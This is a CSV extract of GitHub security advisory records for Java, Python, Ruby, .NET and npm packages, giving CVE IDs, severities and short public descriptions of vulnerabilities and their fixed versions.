2674,34743,org.springframework.amqp:spring-amqp,GHSA-pjqh-2jcc-5j84,CVE-2017-8028,https://github.com/advisories/GHSA-pjqh-2jcc-5j84,high,2022-05-13 01:12:09 UTC,Improper Authentication in Pivotal Spring-LDAP,"In Pivotal Spring-LDAP versions 1.3.0 - 2.3.1, when connected to some LDAP servers, when no additional attributes are bound, and when using LDAP BindAuthenticator with org.springframework.ldap.core.support.DefaultTlsDirContextAuthenticationStrategy as the authentication strategy, and setting userSearch, authentication is allowed with an arbitrary password when the username is correct. This occurs because some LDAP vendors require an explicit operation for the LDAP bind to take effect.",maven
2675,34111,org.springframework.webflow:spring-webflow,GHSA-q4v9-qjmw-j7vf,CVE-2017-8039,https://github.com/advisories/GHSA-q4v9-qjmw-j7vf,moderate,2022-05-13 01:47:15 UTC,Insecure Default Initialization of Resource in Pivotal Spring Web Flow,"An issue was discovered in Pivotal Spring Web Flow through 2.4.5. Applications that do not change the value of the MvcViewFactoryCreator useSpringBinding property which is disabled by default (i.e., set to 'false') can be vulnerable to malicious EL expressions in view states that process form submissions but do not have a sub-element to declare explicit data binding property mappings. NOTE: this issue exists because of an incomplete fix for CVE-2017-4971.",maven
2676,34743,org.springframework.amqp:spring-amqp,GHSA-vqqg-xgv7-cf68,CVE-2017-8045,https://github.com/advisories/GHSA-vqqg-xgv7-cf68,critical,2022-05-17 00:16:13 UTC,Deserialization of Untrusted Data in Spring AMQP,"In Pivotal Spring AMQP versions prior to 1.7.4, 1.6.11, and 1.5.7, an org.springframework.amqp.core.Message may be unsafely deserialized when being converted into a string. A malicious payload could be crafted to exploit this and enable a remote code execution attack.",maven
2677,34601,com.itextpdf:itextpdf,GHSA-86p9-x5pw-94qx,CVE-2017-9096,https://github.com/advisories/GHSA-86p9-x5pw-94qx,high,2022-05-13 01:14:24 UTC,Improper Restriction of XML External Entity Reference in  iText,"The XML parsers in iText before 5.5.12 and 7.x before 7.0.3 do not disable external entities, which might allow remote attackers to conduct XML external entity (XXE) attacks via a crafted PDF.",maven
2678,13063,Nancy,GHSA-mx3q-j2g2-5qxq,CVE-2017-9785,https://github.com/advisories/GHSA-mx3q-j2g2-5qxq,critical,2022-05-17 02:26:07 UTC,Deserialization of Untrusted Data in NancyFX Nancy,Csrf.cs in NancyFX Nancy before 1.4.4 and 2.x before 2.0-dangermouse has Remote Code Execution via Deserialization of JSON data in a CSRF Cookie.,nuget
2679,34519,org.apache.commons:commons-email,GHSA-p7vm-phxx-g722,CVE-2017-9801,https://github.com/advisories/GHSA-p7vm-phxx-g722,high,2022-05-17 02:15:41 UTC,Improper Input Validation in Apache Commons Email,"When a call-site passes a subject for an email that contains line-breaks in Apache Commons Email 1.0 through 1.4, the caller can add arbitrary SMTP headers.",maven
2680,38232,org.apache.sling:org.apache.sling.servlets.post,GHSA-8c82-9rgp-4qvr,CVE-2017-9802,https://github.com/advisories/GHSA-8c82-9rgp-4qvr,moderate,2022-05-14 02:45:32 UTC,Improper Neutralization of Input During Web Page Generation Apache Sling Servlets Post,"The Javascript method Sling.evalString() in Apache Sling Servlets Post before 2.3.22 uses the javascript 'eval' function to parse input strings, which allows for XSS attacks by passing specially crafted input strings.",maven
2681,34025,org.springframework.security:spring-security-core,GHSA-vhrg-v3cv-p247,CVE-2017-4995,https://github.com/advisories/GHSA-vhrg-v3cv-p247,high,2022-05-13 01:02:16 UTC,Deserialization of Untrusted Data in Spring Security,"An issue was discovered in Pivotal Spring Security 4.2.0.RELEASE through 4.2.2.RELEASE, and Spring Security 5.0.0.M1. When configured to enable default typing, Jackson contained a deserialization vulnerability that could lead to arbitrary code execution. Jackson fixed this vulnerability by blacklisting known ""deserialization gadgets."" Spring Security configures Jackson with global default typing enabled, which means that (through the previous exploit) arbitrary code could be executed if all of the following is true: (1) Spring Security's Jackson support is being leveraged by invoking SecurityJackson2Modules.getModules(ClassLoader) or SecurityJackson2Modules.enableDefaultTyping(ObjectMapper); (2) Jackson is used to deserialize data that is not trusted (Spring Security does not perform deserialization using Jackson, so this is an explicit choice of the user); and (3) there is an unknown (Jackson is not blacklisting it already) ""deserialization gadget"" that allows code execution present on the classpath. Jackson provides a blacklisting approach to protecting against this type of attack, but Spring Security should be proactive against blocking unknown ""deserialization gadgets"" when Spring Security enables default typing.",maven
2682,36708,org.jolokia:jolokia-core,GHSA-hfpg-gqjw-779m,CVE-2018-1000129,https://github.com/advisories/GHSA-hfpg-gqjw-779m,moderate,2022-05-14 01:27:45 UTC,Cross-site Scripting in Jolokia agent,An XSS vulnerability exists in the Jolokia agent version 1.3.7 in the HTTP servlet that allows an attacker to execute malicious javascript in the victim's browser.,maven
2683,36708,org.jolokia:jolokia-core,GHSA-rhqj-4pp8-vvgf,CVE-2018-1000130,https://github.com/advisories/GHSA-rhqj-4pp8-vvgf,high,2022-05-14 01:27:09 UTC,Injection in Jolokia agent,A JNDI Injection vulnerability exists in Jolokia agent version 1.3.7 in the proxy mode that allows a remote attacker to run arbitrary Java code on the server.,maven
2684,34323,com.unboundid:unboundid-ldapsdk,GHSA-qwq9-8rpf-8mp7,CVE-2018-1000134,https://github.com/advisories/GHSA-qwq9-8rpf-8mp7,critical,2022-05-13 01:48:32 UTC,Weak Password Requirements in UnboundID LDAP SDK,"UnboundID LDAP SDK version from commit 801111d8b5c732266a5dbd4b3bb0b6c7b94d7afb up to commit 8471904a02438c03965d21367890276bc25fa5a6, where the issue was reported and fixed contains an Incorrect Access Control vulnerability in process function in SimpleBindRequest class doesn't check for empty password when running in synchronous mode. The issue can result in ability to impersonate any valid user. This attack appear to be exploitable via Providing valid username and empty password against servers that do not do additional validation as per https://tools.ietf.org/html/rfc4513#section-5.1.1. This vulnerability appears to have been fixed in commit 8471904a02438c03965d21367890276bc25fa5a6.",maven
2685,34219,org.codehaus.plexus:plexus-archiver,GHSA-hcxq-x77q-3469,CVE-2018-1002200,https://github.com/advisories/GHSA-hcxq-x77q-3469,moderate,2022-05-13 01:35:03 UTC,Improper Limitation of a Pathname to a Restricted Directory in plexus-archiver,"plexus-archiver before 3.6.0 is vulnerable to directory traversal, allowing attackers to write to arbitrary files via a ../ (dot dot slash) in an archive entry that is mishandled during extraction. This vulnerability is also known as 'Zip-Slip'.",maven
2686,35946,org.zeroturnaround:zt-zip,GHSA-qcf3-9vmh-xw4r,CVE-2018-1002201,https://github.com/advisories/GHSA-qcf3-9vmh-xw4r,moderate,2022-05-13 01:30:44 UTC,Improper Limitation of a Pathname to a Restricted Directory in zt-zip,"zt-zip before 1.13 is vulnerable to directory traversal, allowing attackers to write to arbitrary files via a ../ (dot dot slash) in a Zip archive entry that is mishandled during extraction. This vulnerability is also known as 'Zip-Slip'.",maven
2687,35136,net.lingala.zip4j:zip4j,GHSA-2rpm-4x8c-pvqg,CVE-2018-1002202,https://github.com/advisories/GHSA-2rpm-4x8c-pvqg,moderate,2022-05-13 01:35:04 UTC,Improper Limitation of a Pathname to a Restricted Directory in Zip4j,"zip4j before 1.3.3 is vulnerable to directory traversal, allowing attackers to write to arbitrary files via a ../ (dot dot slash) in a Zip archive entry that is mishandled during extraction. This vulnerability is also known as 'Zip-Slip'.",maven
2688,12991,SharpZipLib,GHSA-cqj4-m2pc-v9m5,CVE-2018-1002208,https://github.com/advisories/GHSA-cqj4-m2pc-v9m5,moderate,2022-05-13 01:35:03 UTC,Improper Limitation of a Pathname to a Restricted Directory in SharpZipLib,"SharpZipLib before 1.0 RC1 is vulnerable to directory traversal, allowing attackers to write to arbitrary files via a ../ (dot dot slash) in a Zip archive entry that is mishandled during extraction. This vulnerability is also known as 'Zip-Slip'.",nuget
2689,33927,org.codehaus.plexus:plexus-utils,GHSA-8vhq-qq4p-grq3,CVE-2017-1000487,https://github.com/advisories/GHSA-8vhq-qq4p-grq3,critical,2022-05-13 01:11:53 UTC,OS Command Injection in Plexus-utils,Plexus-utils before 3.0.16 is vulnerable to command injection because it does not correctly process the contents of double quoted strings.,maven
2690,20612,supervisor,GHSA-x7c8-4x3h-874w,CVE-2017-11610,https://github.com/advisories/GHSA-x7c8-4x3h-874w,high,2022-05-13 01:42:26 UTC,Incorrect Default Permissions in Supervisor,"The XML-RPC server in supervisor before 3.0.1, 3.1.x before 3.1.4, 3.2.x before 3.2.4, and 3.3.x before 3.3.3 allows remote authenticated users to execute arbitrary commands via a crafted XML-RPC request, related to nested supervisord namespace lookups.",pip
2691,36825,org.hornetq:hornetq-server,GHSA-gc96-h5pr-839j,CVE-2017-12174,https://github.com/advisories/GHSA-gc96-h5pr-839j,high,2022-05-13 01:11:53 UTC,Uncontrolled Resource Consumption in Artemis and HornetQ,"It was found that when Artemis and HornetQ before 2.4.0 are configured with UDP discovery and JGroups discovery a huge byte array is created when receiving an unexpected multicast message. This may result in a heap memory exhaustion, full GC, or OutOfMemoryError.",maven
2692,34497,io.undertow:undertow-core,GHSA-cp7v-vmv7-6x2q,CVE-2017-12196,https://github.com/advisories/GHSA-cp7v-vmv7-6x2q,moderate,2022-05-13 01:38:10 UTC,Incorrect Authorization in Undertow,"Undertow before versions 1.4.18.SP1 (not findable in Maven), 2.0.2.Final, and 1.4.24.Final was found vulnerable when using Digest authentication, the server does not ensure that the value of URI in the Authorization header matches the URI in HTTP request line. This allows the attacker to cause a MITM attack and access the desired content on the server.",maven
2693,34169,org.apache.kafka:kafka-clients,GHSA-xm78-4m3g-7wm7,CVE-2017-12610,https://github.com/advisories/GHSA-xm78-4m3g-7wm7,moderate,2022-05-13 01:25:19 UTC,Improper Authentication in Apache Kafka,"In Apache Kafka 0.10.0.0 to 0.10.2.1 and 0.11.0.0 to 0.11.0.1, authenticated Kafka clients may use impersonation via a manually crafted protocol message with SASL/PLAIN or SASL/SCRAM authentication when using the built-in PLAIN or SCRAM server implementations in Apache Kafka.",maven
2694,34423,org.apache.tomcat:tomcat-catalina,GHSA-8qq4-8jvq-mfw4,CVE-2017-12616,https://github.com/advisories/GHSA-8qq4-8jvq-mfw4,high,2022-05-14 01:10:16 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Apache Tomcat,When using a VirtualDirContext with Apache Tomcat 7.0.0 to 7.0.80 it was possible to bypass security constraints and/or view the source code of JSPs for resources served by the VirtualDirContext using a specially crafted request.,maven
2695,34975,org.apache.opennlp:opennlp-tools,GHSA-h22x-hm8g-rxpg,CVE-2017-12620,https://github.com/advisories/GHSA-h22x-hm8g-rxpg,critical,2022-05-17 00:29:00 UTC,Improper Restriction of XML External Entity Reference in Apache OpenNLP,"When loading models or dictionaries that contain XML it is possible to perform an XXE attack, since Apache OpenNLP is a library, this only affects applications that load models or dictionaries from untrusted sources. The versions 1.5.0 to 1.5.3, 1.6.0, 1.7.0 to 1.7.2, 1.8.0 to 1.8.1 of Apache OpenNLP are affected.",maven
2696,34744,commons-jelly:commons-jelly,GHSA-6g33-82gc-3pw5,CVE-2017-12621,https://github.com/advisories/GHSA-6g33-82gc-3pw5,critical,2022-05-17 00:34:13 UTC,Improper Restriction of XML External Entity Reference in Jelly,"During Jelly (xml) file parsing with Apache Xerces, if a custom doctype entity is declared with a ""SYSTEM"" entity with a URL and that entity is used in the body of the Jelly file, during parser instantiation the parser will attempt to connect to said URL. This could lead to XML External Entity (XXE) attacks in Apache Commons Jelly before 1.0.1.",maven
2697,34718,org.apache.cxf:cxf-core,GHSA-7vgj-8mw4-hg8r,CVE-2017-12624,https://github.com/advisories/GHSA-7vgj-8mw4-hg8r,moderate,2022-05-13 01:09:20 UTC,Improper Input Validation in Apache CXF,"Apache CXF supports sending and receiving attachments via either the JAX-WS or JAX-RS specifications. It is possible to craft a message attachment header that could lead to a Denial of Service (DoS) attack on a CXF web service provider. Both JAX-WS and JAX-RS services are vulnerable to this attack. From Apache CXF 3.2.1 and 3.1.14, message attachment headers that are greater than 300 characters will be rejected by default. This value is configurable via the property ""attachment-max-header-size"".",maven
2698,34428,com.nimbusds:nimbus-jose-jwt,GHSA-pfv2-37f7-9m6w,CVE-2017-12974,https://github.com/advisories/GHSA-pfv2-37f7-9m6w,high,2022-05-13 01:30:32 UTC,Improper Verification of Cryptographic Signature in Nimbus JOSE+JWT,"Nimbus JOSE+JWT before 4.36 proceeds with ECKey construction without ensuring that the public x and y coordinates are on the specified curve, which allows attackers to conduct an Invalid Curve Attack in environments where the JCE provider lacks the applicable curve validation.",maven
2699,34021,org.bouncycastle:bcprov-jdk15on,GHSA-wrwf-pmmj-w989,CVE-2017-13098,https://github.com/advisories/GHSA-wrwf-pmmj-w989,moderate,2022-05-13 01:14:24 UTC,Observable Discrepancy in BouncyCastle,"BouncyCastle TLS prior to version 1.0.3, when configured to use the JCE (Java Cryptography Extension) for cryptographic functions, provides a weak Bleichenbacher oracle when any TLS cipher suite using RSA key exchange is negotiated. An attacker can recover the private key from a vulnerable application. This vulnerability is referred to as ""ROBOT.""",maven
2700,34713,org.apache.uima:uimaj-core,GHSA-wp2f-hrg2-3r5m,CVE-2017-15691,https://github.com/advisories/GHSA-wp2f-hrg2-3r5m,moderate,2022-05-14 00:58:02 UTC,Improper Restriction of XML External Entity Reference in  Apache uimaj,"In Apache uimaj prior to 2.10.2, Apache uimaj 3.0.0-xxx prior to 3.0.0-beta, Apache uima-as prior to 2.10.2, Apache uimaFIT prior to 2.4.0, Apache uimaDUCC prior to 2.2.2, this vulnerability relates to an XML external entity expansion (XXE) capability of various XML parsers. UIMA as part of its configuration and operation may read XML from various sources, which could be tainted in ways to cause inadvertent disclosure of local files or other internal content.",maven
2701,35752,org.apache.uima:uimafit-core,GHSA-wp2f-hrg2-3r5m,CVE-2017-15691,https://github.com/advisories/GHSA-wp2f-hrg2-3r5m,moderate,2022-05-14 00:58:02 UTC,Improper Restriction of XML External Entity Reference in  Apache uimaj,"In Apache uimaj prior to 2.10.2, Apache uimaj 3.0.0-xxx prior to 3.0.0-beta, Apache uima-as prior to 2.10.2, Apache uimaFIT prior to 2.4.0, Apache uimaDUCC prior to 2.2.2, this vulnerability relates to an XML external entity expansion (XXE) capability of various XML parsers. UIMA as part of its configuration and operation may read XML from various sources, which could be tainted in ways to cause inadvertent disclosure of local files or other internal content.",maven
2702,34125,org.apache.hadoop:hadoop-client,GHSA-qm7f-r83w-3p46,CVE-2017-3161,https://github.com/advisories/GHSA-qm7f-r83w-3p46,moderate,2022-05-13 01:08:56 UTC,Improper Neutralization of Input During Web Page Generation in Apache Hadoop,The HDFS web UI in Apache Hadoop before 2.7.0 is vulnerable to a cross-site scripting (XSS) attack through an unescaped query parameter.,maven
2703,34125,org.apache.hadoop:hadoop-client,GHSA-pr9x-qmp5-j3rr,CVE-2017-3162,https://github.com/advisories/GHSA-pr9x-qmp5-j3rr,high,2022-05-13 01:08:56 UTC,Improper Input Validation in Apache Hadoop,HDFS clients interact with a servlet on the DataNode to browse the HDFS namespace. The NameNode is provided as a query parameter that is not validated in Apache Hadoop before 2.7.0.,maven
2704,33924,mysql:mysql-connector-java,GHSA-2xxh-f8r3-hvvr,CVE-2017-3523,https://github.com/advisories/GHSA-2xxh-f8r3-hvvr,high,2022-05-13 01:45:34 UTC,Improper Access Control in MySQL Connectors Java,"Vulnerability in the MySQL Connectors component of Oracle MySQL (subcomponent: Connector/J). Supported versions that are affected are 5.1.40 and earlier. Difficult to exploit vulnerability allows low privileged attacker with network access via multiple protocols to compromise MySQL Connectors. While the vulnerability is in MySQL Connectors, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of MySQL Connectors. CVSS 3.0 Base Score 8.5 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H).",maven
2705,33924,mysql:mysql-connector-java,GHSA-pwh7-92h3-mqr6,CVE-2017-3586,https://github.com/advisories/GHSA-pwh7-92h3-mqr6,moderate,2022-05-13 01:45:42 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Oracle MySQL Connectors Java,"Vulnerability in the MySQL Connectors component of Oracle MySQL (subcomponent: Connector/J). Supported versions that are affected are 5.1.41 and earlier. Easily ""exploitable"" vulnerability allows low privileged attacker with network access via multiple protocols to compromise MySQL Connectors. While the vulnerability is in MySQL Connectors, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of MySQL Connectors accessible data as well as unauthorized read access to a subset of MySQL Connectors accessible data. CVSS 3.0 Base Score 6.4 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N).",maven
2706,33924,mysql:mysql-connector-java,GHSA-cjcf-wm2p-59h5,CVE-2017-3589,https://github.com/advisories/GHSA-cjcf-wm2p-59h5,low,2022-05-13 01:45:42 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Oracle MySQL Connectors Java,"Vulnerability in the MySQL Connectors component of Oracle MySQL (subcomponent: Connector/J). Supported versions that are affected are 5.1.41 and earlier. Easily ""exploitable"" vulnerability allows low privileged attacker with logon to the infrastructure where MySQL Connectors executes to compromise MySQL Connectors. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of MySQL Connectors accessible data. CVSS 3.0 Base Score 3.3 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N).",maven
2707,34111,org.springframework.webflow:spring-webflow,GHSA-fg9w-cffm-pmh2,CVE-2017-4971,https://github.com/advisories/GHSA-fg9w-cffm-pmh2,moderate,2022-05-13 01:45:59 UTC,Insecure Default Initialization of Resource in Pivotal Spring Web Flow,"An issue was discovered in Pivotal Spring Web Flow through 2.4.4. Applications that do not change the value of the MvcViewFactoryCreator useSpringBinding property which is disabled by default (i.e., set to 'false') can be vulnerable to malicious EL expressions in view states that process form submissions but do not have a sub-element to declare explicit data binding property mappings.",maven
2708,34093,org.apache.zookeeper:zookeeper,GHSA-7cwj-j333-x7f7,CVE-2017-5637,https://github.com/advisories/GHSA-7cwj-j333-x7f7,high,2022-05-13 01:08:23 UTC,Uncontrolled Resource Consumption in Apache ZooKeeper,"Two four letter word commands ""wchp/wchc"" are CPU intensive and could cause spike of CPU utilization on Apache ZooKeeper server if abused, which leads to the server unable to serve legitimate client requests. Apache ZooKeeper thru version 3.4.9 and 3.5.2 suffer from this issue, fixed in 3.4.10, 3.5.3, and later.",maven
2709,34081,org.apache.poi:poi,GHSA-78vv-qj73-h9m5,CVE-2017-5644,https://github.com/advisories/GHSA-78vv-qj73-h9m5,moderate,2022-05-13 01:14:24 UTC,Improper Restriction of Recursive Entity References in DTDs in Apache POI,"Apache POI in versions prior to release 3.15 allows remote attackers to cause a denial of service (CPU consumption) via a specially crafted OOXML file, aka an XML Entity Expansion (XEE) attack.",maven
2710,34718,org.apache.cxf:cxf-core,GHSA-hgg6-8x62-m9gf,CVE-2017-5653,https://github.com/advisories/GHSA-hgg6-8x62-m9gf,moderate,2022-05-13 01:09:19 UTC,Improper Certificate Validation in Apache CXF,"JAX-RS XML Security streaming clients in Apache CXF before 3.1.11 and 3.0.13 do not validate that the service response was signed or encrypted, which allows remote attackers to spoof servers.",maven
2711,34718,org.apache.cxf:cxf-core,GHSA-v936-x3j5-c76j,CVE-2017-5656,https://github.com/advisories/GHSA-v936-x3j5-c76j,high,2022-05-13 01:09:19 UTC,Session Fixation in Apache CXF,"Apache CXF's STSClient before 3.1.11 and 3.0.13 uses a flawed way of caching tokens that are associated with delegation tokens, which means that an attacker could craft a token which would return an identifer corresponding to a cached token for another user.",maven
2712,35030,org.apache.xmlgraphics:fop,GHSA-5hg8-r9vq-gjqp,CVE-2017-5661,https://github.com/advisories/GHSA-5hg8-r9vq-gjqp,high,2022-05-13 01:07:54 UTC,Improper Restriction of XML External Entity Reference in Apache FOP,"In Apache FOP before 2.2, files lying on the filesystem of the server which uses FOP can be revealed to arbitrary users who send maliciously formed SVG files. The file types that can be shown depend on the user context in which the exploitable application is running. If the user is root a full compromise of the server - including confidential or sensitive files - would be possible. XXE can also be used to attack the availability of the server via denial of service as the references within a xml document can trivially trigger an amplification attack.",maven
2713,19895,openpyxl,GHSA-chqf-hx79-gxc6,CVE-2017-5992,https://github.com/advisories/GHSA-chqf-hx79-gxc6,high,2022-05-17 02:58:54 UTC,Improper Restriction of XML External Entity Reference in Openpyxl,"Openpyxl 2.4.1 resolves external entities by default, which allows remote attackers to conduct XXE attacks via a crafted .xlsx document.",pip
2714,28559,ruby-mysql,GHSA-73pr-g6jj-5hc9,CVE-2021-3779,https://github.com/advisories/GHSA-73pr-g6jj-5hc9,moderate,2022-06-29 00:00:27 UTC,Externally Controlled Reference to a Resource in Another Sphere in ruby-mysql,"A malicious actor can read arbitrary files from a client that uses ruby-mysql to communicate to a rogue MySQL server and issue database queries. In these cases, the server has the option to create a database reply using the LOAD DATA LOCAL statement, which instructs the client to provide additional data from a local file readable by the client (and not a ""local"" file on the server).",rubygems
2715,29034,pycares,GHSA-c58j-88f5-h53f,,https://github.com/advisories/GHSA-c58j-88f5-h53f,moderate,2022-07-05 22:08:20 UTC,Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') in pycares,"### Impact

pycares versions < 4.2.0 are affected by [CVE-2021-3672](https://nvd.nist.gov/vuln/detail/CVE-2021-3672).

### Patches

Update to version 4.2.0.
",pip
2716,28929,salt,GHSA-pf7h-h2wq-m7pg,CVE-2021-21996,https://github.com/advisories/GHSA-pf7h-h2wq-m7pg,high,2021-11-21 00:00:58 UTC,Exposure of Resource to Wrong Sphere in salt,"An issue was discovered in SaltStack Salt before 3003.3. A user who has control of the source, and source_hash URLs can gain full file system access as root on a salt minion.",pip
2717,36517,org.directwebremoting:dwr,GHSA-hg5p-233h-c7fh,CVE-2007-0185,https://github.com/advisories/GHSA-hg5p-233h-c7fh,high,2022-05-01 17:42:17 UTC,Direct Web Remoting vulnerable to Denial of Service,Getahead Direct Web Remoting (DWR) before 1.1.4 allows attackers to cause a denial of service (memory exhaustion and servlet outage) via unknown vectors related to a large number of calls in a batch.,maven
2718,20357,ujson,GHSA-wpqr-jcpx-745r,CVE-2022-31116,https://github.com/advisories/GHSA-wpqr-jcpx-745r,high,2022-07-05 21:06:00 UTC,Incorrect handling of invalid surrogate pair characters,"### Impact
_What kind of vulnerability is it? Who is impacted?_

Anyone parsing JSON from an untrusted source is vulnerable.

JSON strings that contain escaped surrogate characters not part of a proper surrogate pair were decoded incorrectly. Besides corrupting strings, this allowed for potential key confusion and value overwriting in dictionaries.

Examples:

```python
# An unpaired high surrogate character is ignored.
>>> ujson.loads(r'""\uD800""')
''
>>> ujson.loads(r'""\uD800hello""')
'hello'

# An unpaired low surrogate character is preserved.
>>> ujson.loads(r'""\uDC00""')
'\udc00'

# A pair of surrogates with additional non surrogate characters pair up in spite of being invalid.
>>> ujson.loads(r'""\uD800foo bar\uDC00""')
'foo bar𐀀'
```

### Patches
_Has the problem been patched? What versions should users upgrade to?_

Users should upgrade to UltraJSON 5.4.0.

From version 5.4.0, UltraJSON decodes lone surrogates in the same way as the standard library's `json` module does, preserving them in the parsed output:

```python3
>>> ujson.loads(r'""\uD800""')
'\ud800'
>>> ujson.loads(r'""\uD800hello""')
'\ud800hello'
>>> ujson.loads(r'""\uDC00""')
'\udc00'
>>> ujson.loads(r'""\uD800foo bar\uDC00""')
'\ud800foo bar\udc00'
```

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

Short of switching to an entirely different JSON library, there are no safe alternatives to upgrading.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [UltraJSON](http://github.com/ultrajson/ultrajson/issues)
",pip
2719,20357,ujson,GHSA-fm67-cv37-96ff,CVE-2022-31117,https://github.com/advisories/GHSA-fm67-cv37-96ff,moderate,2022-07-05 21:05:59 UTC,Potential double free of buffer during string decoding,"### Impact
_What kind of vulnerability is it? Who is impacted?_

When an error occurs while reallocating the buffer for string decoding, the buffer gets freed twice.

Due to how UltraJSON uses the internal decoder, this double free is impossible to trigger from Python.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

Users should upgrade to UltraJSON 5.4.0.

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

There is no workaround.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [UltraJSON](http://github.com/ultrajson/ultrajson/issues)
",pip
2720,27604,rails-html-sanitizer,GHSA-pg8v-g4xq-hww9,CVE-2022-32209,https://github.com/advisories/GHSA-pg8v-g4xq-hww9,moderate,2022-06-25 00:00:54 UTC,Rails::Html::Sanitizer vulnerable to Cross-site Scripting,"Versions of Rails::Html::Sanitizer prior to version 1.4.3 are vulnerable to XSS with certain configurations of Rails::Html::Sanitizer which  allows an attacker to inject content when the application developer has overridden the sanitizer's allowed tags to allow both `select` and `style` elements. Code is only impacted if allowed tags are being overridden. 

This may be done via application configuration: ```ruby# In config/application.rbconfig.action_view.sanitized_allowed_tags = [""select"", ""style""]```

see https://guides.rubyonrails.org/configuring.html#configuring-action-view

Or it may be done with a `:tags` option to the Action View helper `sanitize`: ```<%= sanitize @comment.body, tags: [""select"", ""style""] %>``` 

see https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html#method-i-sanitize 

It may also be done with Rails::Html::SafeListSanitizer directly: 
```ruby# class-level optionRails::Html::SafeListSanitizer.allowed_tags = [""select"", ""style""]```  or with
```ruby# instance-level optionRails::Html::SafeListSanitizer.new.sanitize(@article.body, tags: [""select"", ""style""])```

All users overriding the allowed tags by any of the above mechanisms to include both ""select"" and ""style"" are recommended to upgrade immediately. A workaround for this issue can be applied by removing either `select` or `style` from the overridden allowed tags.",rubygems
2721,16304,passport,GHSA-v923-w3x8-wh69,CVE-2022-25896,https://github.com/advisories/GHSA-v923-w3x8-wh69,moderate,2022-07-02 00:00:19 UTC,Passport before 0.6.0 vulnerable to session regeneration when a users logs in or out,"This affects the package passport before 0.6.0. When a user logs in or logs out, the session is regenerated instead of being closed.",npm
2722,36517,org.directwebremoting:dwr,GHSA-hqw5-62gp-rqgm,CVE-2014-5325,https://github.com/advisories/GHSA-hqw5-62gp-rqgm,moderate,2022-05-17 03:46:06 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Direct Web Remoting,"The (1) DOMConverter, (2) JDOMConverter, (3) DOM4JConverter, and (4) XOMConverter functions in Direct Web Remoting (DWR) through 2.0.10 and 3.x through 3.0.RC2 allow remote attackers to read arbitrary files via DOM data containing an XML external entity declaration in conjunction with an entity reference, related to an XML External Entity (XXE) issue.",maven
2723,36517,org.directwebremoting:dwr,GHSA-q5v2-2v66-6hwm,CVE-2014-5326,https://github.com/advisories/GHSA-q5v2-2v66-6hwm,moderate,2022-05-17 04:21:06 UTC,Improper Neutralization of Input During Web Page Generation in Direct Web Remoting,Cross-site scripting (XSS) vulnerability in Direct Web Remoting (DWR) through 2.0.10 and 3.x through 3.0.RC2 allows remote attackers to inject arbitrary web script or HTML via unspecified vectors.,maven
2724,34497,io.undertow:undertow-core,GHSA-h6p6-fc4w-cqhx,CVE-2014-7816,https://github.com/advisories/GHSA-h6p6-fc4w-cqhx,moderate,2022-05-17 04:15:16 UTC,Improper Limitation of a Pathname to a Restricted Directory in JBoss Undertow,"Directory traversal vulnerability in JBoss Undertow 1.0.x before 1.0.17, 1.1.x before 1.1.0.CR5, and 1.2.x before 1.2.0.Beta3, when running on Windows, allows remote attackers to read arbitrary files via a .. (dot dot) in a resource URI.",maven
2725,35045,org.apache.activemq:activemq-client,GHSA-9cvr-8xq4-2m73,CVE-2014-8110,https://github.com/advisories/GHSA-9cvr-8xq4-2m73,moderate,2022-05-14 01:14:52 UTC,Improper Neutralization of Input During Web Page Generation in Apache ActiveMQ,Multiple cross-site scripting (XSS) vulnerabilities in the web based administration console in Apache ActiveMQ 5.x before 5.10.1 allow remote attackers to inject arbitrary web script or HTML via unspecified vectors.,maven
2726,35465,org.drools:drools-core,GHSA-6qx9-rf9g-7jmr,CVE-2014-8125,https://github.com/advisories/GHSA-6qx9-rf9g-7jmr,high,2022-05-17 04:12:57 UTC,Improper Input Validation in Drools and jBPM,XML external entity (XXE) vulnerability in Drools and jBPM before 6.2.0 allows remote attackers to read arbitrary files or possibly have other unspecified impact via a crafted BPMN2 file.,maven
2727,34807,org.apache.santuario:xmlsec,GHSA-w7cq-j9p9-hm3m,CVE-2014-8152,https://github.com/advisories/GHSA-w7cq-j9p9-hm3m,moderate,2022-05-13 01:05:55 UTC,Improper Input Validation in Apache Santuario XML Security,Apache Santuario XML Security for Java 2.0.x before 2.0.3 allows remote attackers to bypass the streaming XML signature protection mechanism via a crafted XML document.,maven
2728,34081,org.apache.poi:poi,GHSA-x9mm-6gpf-f749,CVE-2014-9527,https://github.com/advisories/GHSA-x9mm-6gpf-f749,moderate,2022-05-17 03:00:44 UTC,Loop with Unreachable Exit Condition in Apache POI,HSLFSlideShow in Apache POI before 3.11 allows remote attackers to cause a denial of service (infinite loop and deadlock) via a crafted PPT file.,maven
2729,34603,org.jasypt:jasypt,GHSA-r5c2-rxh2-f5h2,CVE-2014-9970,https://github.com/advisories/GHSA-r5c2-rxh2-f5h2,high,2022-05-14 03:44:52 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Apache Jasypt,jasypt before 1.9.2 allows a timing attack against the password hash comparison.,maven
2730,35696,org.apache.ws.security:wss4j,GHSA-6r5v-hp32-fjqw,CVE-2015-0227,https://github.com/advisories/GHSA-6r5v-hp32-fjqw,moderate,2022-05-14 02:57:28 UTC,Improper Access Control in Apache WSS4J,"Apache WSS4J before 1.6.17 and 2.x before 2.0.2 allows remote attackers to bypass the requireSignedEncryptedDataElements configuration via a vectors related to ""wrapping attacks.""",maven
